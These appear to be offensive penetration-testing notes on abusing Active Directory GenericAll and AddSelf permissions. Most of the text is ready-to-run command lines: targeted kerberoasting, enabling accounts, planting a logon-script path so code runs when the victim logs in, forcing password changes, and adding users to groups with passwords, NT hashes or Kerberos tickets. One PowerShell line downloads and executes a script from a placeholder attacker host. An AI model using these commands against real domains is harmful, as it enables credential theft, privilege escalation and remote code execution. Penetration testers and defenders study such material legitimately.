# Abusing GenericAll (User over User)

If an user have GenericAll over an user can get user NT hash, enable/disable user, change password, and change user properties, this properties include change logon script wich allos for RCE if user connects. It is recomende to first, get the nt hash (or if not possible kerberos hash), then check if user conects frequently, and if both ways are not allowed go for changing the password.

### From Linux (externally, recomended)

#### Shado credentials attack (get NThash):

Check Shadow credentials seccion -> https://github.com/ArtesOscuras/Notes/blob/main/abusing_DACLs/AddKeyCredentialLink%20(SHADOW%20CREDENTIALS).md

<br>

#### Target kerberoast (get kerberoast hash):

You can make the user kerberoastable. User is required to be enabled. If it's not, enable it first. Additionally may require to sinc datetime with DC for kerberos interaction.

`targetedKerberoast.py -v -d '<domain>' -u '<controlled user>' -p '<controlled user password>'`

source: https://github.com/ShutdownRepo/targetedKerberoast

<br>

#### Enable user (or change other properties):

`ldap_shell.py '<domain>/<user you control>:<password>' -dc-ip <ip>`

When inside use the interactive shell to change properties. Example "enable_account <user>".

Source: https://github.com/PShlyundin/ldap_shell

<br>

#### Set logon script (get RCE if user login):

You can force the user to execute specific program or script, and if user logs into the system, that program will be executed.

`bloodyAD --host '<dc_ip>' -d '<domain>' -u '<controlled user>' -p '<password>' set object <target user> msTSInitialProgram -v '\\1.2.3.4\share\file.exe'`

Source: https://www.thehacker.recipes/ad/movement/dacl/logon-script

<br>

#### Change user password (Force Change Password):

You can change user password remotly and then use it to connect via winrm, rdp etc...

Check Force Change Password seccion -> 


<br>
<br>
<br>




# Abusing AddSelf

If an user have AddSelf over a group can add itself inside the group. This can be done with multiple tools.

### From Linux (enternally recomended):

Samba tools -> `net rpc group addmem '<target_group>' '<target_user>' -U '<domain>'/'<controlled_user>'%'<password>' -S '<dc-ip>'`

BloodyAD -> `bloodyAD --host '<dc-ip>' -d '<domain>' -u '<user>' -p '<password>' add groupMember '<group>' '<user>'`

Ldap_shell -> `ldap_shell <domain>/<user>:<password> -dc-ip <ip>`

`add_user_to_group <user> <group>`

<br>

With PASS THE HASH option:

Samba tools -> `pth-net rpc group addmem '<target_group>' '<target_user>' -U '<domain>'/'<controlled_user>'%'LMhash':'NThash' -S '<dc ip>'`

BloodyAD -> `bloodyAD --host '<dc-ip>' -d '<domain>' -u '<user>' -p ':<nt_hash>' add groupMember '<group>' '<user>'`

Ldap_shell -> `ldap_shell '<domain>/<user>:' -hashes ffffffffffffffffffffffffffffffff:<nt_hash> -dc-ip <ip>`

`add_user_to_group <user> <group>`

<br>

With KERBEROS auth:

Ldap_shell -> `gettgt.py <domain>/<user>:<password>`

`export KRB5CCNAME=<ticket_name>`

`ldap_shell '<domain>/<user>:<password>' -dc-host <machine.domain> -k`

`add_user_to_group <user> <group>`

BloodyAD -> `gettgt.py <domain>/<user>:<password>`

`export KRB5CCNAME=<ticket_name>`

`bloodyAD --host '<dc_ip>' -d '<domain>' -u '<user>' -k --host <machine.domain> add groupMember '<group>' '<user to add in group>'`

<br>

### From Windows (internally):

`net group <group> <user> /add /domain`

Additionally can be done with Active directory module (powershell module):

`Add-ADGroupMember -Identity '<group>' -Members '<user>'`

Also is possible with powerview module:

Load module -> `IEX (new-object net.webclient).downloadstring('http://<your_evil_ip_or_domain>/powerview.ps1')`

`Add-DomainGroupMember -Identity '<group>' -Members '<user>'`

<br>

### Articles:

https://www.hackingarticles.in/addself-active-directory-abuse/

https://bloodhound.specterops.io/resources/edges/add-self




